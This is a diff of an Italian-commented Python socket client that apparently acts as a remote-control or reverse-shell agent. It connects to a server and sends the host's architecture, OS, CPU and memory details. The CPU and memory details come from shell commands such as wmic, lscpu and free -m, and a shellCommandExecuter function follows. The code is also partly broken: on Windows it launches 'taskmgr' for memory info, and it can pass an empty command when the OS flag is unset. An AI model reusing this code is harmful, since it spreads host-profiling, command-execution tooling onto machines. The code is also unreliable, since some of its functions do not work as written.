@@ -6,7 +6,8 @@ import os
 import time
 
 serverIp = 'localhost'
-serverPort = 12018
+# mettere .local se hostname locale
+serverPort = 12007
 
 windowsFlag = "n"
 
@@ -66,15 +67,7 @@ def StartConnection():  # apre la connessione con il server
         time.sleep(5)
 
     return clientSocket
-
-
-def sendOsInfo(clientSocket: socket):  # funzione che invia informazioni di sistema
-    pack = "Architecture: " + platform.architecture()[
-        0] + "\nMacchine: " + platform.machine() + "\nSystem name: " + platform.system()
-    pack = pack + "\nOperating system release: " + platform.release() + "\nOperating system version: " + \
-           platform.version() + "\nNode: " + platform.node() + "\nPlatform: " + platform.platform() + "\nProcessor: " + platform.processor()
-    clientSocket.send(pack.encode())
-
+    
 
 def RecuperaOs(clientSocket: socket):
     global windowsFlag
@@ -110,13 +103,48 @@ def sendString(socket: socket, res: str):
     are = g.__len__()
     socket.send(str(are).encode())
     print(socket.recv(1024).decode())
-    for i in g:
-        socket.send(i)
+    for k in g:
+        socket.send(k)
         socket.recv(2)
-        print(i)
+        print(k)
     return g
 
+def sendOsInfo(clientSocket: socket):  # funzione che invia informazioni di sistema
+    pack = "\n\n##################################################################################"
+    pack = pack + "Architecture: " + platform.architecture()[
+        0] + "\nMacchine: " + platform.machine() + "\nSystem name: " + platform.system()
+    pack = pack + "\nOperating system release: " + platform.release() + "\nOperating system version: " + \
+           platform.version() + "\nNode: " + platform.node() + "\nPlatform: " + platform.platform() + "\nProcessor: " + platform.processor()
+    
+    pack = pack + infoCpu()
+    pack = pack + infoMem()
+    sendString(clientSocket, pack)
 
+def infoCpu():
+    cmd = ""
+    
+    if windowsFlag == "w":
+        cmd = "wmic cpu get caption, deviceid, name, numberofcores, maxclockspeed, status"
+    elif windowsFlag == "u":
+        cmd = "lscpu"
+    
+    output = "\n\nInfo CPU\n" + subprocess.check_output(cmd, shell=True).decode("utf-8", "ignore")
+    if output == "":
+        output = "NULL"
+    return output
+
+def infoMem():
+    cmd = ""
+    
+    if windowsFlag == "w":
+        cmd = "taskmgr"
+    elif windowsFlag == "u":
+        cmd = "free -m"
+    
+    output = "\n\nInfo mem\n" + subprocess.check_output(cmd, shell=True).decode("utf-8", "ignore")
+    if output == "":
+        output = "NULL"
+    return output
 
 
 def shellCommandExecuter(clientSocket, cmd):
